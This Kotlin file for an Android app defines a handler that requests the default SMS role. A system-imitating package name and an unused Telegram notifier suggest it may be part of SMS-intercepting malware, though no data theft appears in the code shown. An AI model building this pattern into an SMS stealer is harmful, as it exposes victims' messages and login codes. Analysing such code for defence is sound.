package com.android.quickdraw.core

import android.app.Activity
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import androidx.activity.result.ActivityResultLauncher
import androidx.appcompat.app.AppCompatActivity

class PermissionsHandler(
    private val activity: AppCompatActivity,
    private val resultLauncher: ActivityResultLauncher<Intent>,
    private val notifier: TelegramNotifier
) {
    fun changeDefaultSmsApp() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val roleManager = activity.getSystemService(Context.ROLE_SERVICE) as RoleManager
                if (roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                    if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                        val roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                        resultLauncher.launch(roleRequestIntent)
                    }
                }
            } else {
                val myPackageName = activity.packageName
                val setSmsAppIntent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                setSmsAppIntent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName)
                resultLauncher.launch(setSmsAppIntent)
            }
        } catch (e: Exception) {
            activity.finish()
        }
    }
}
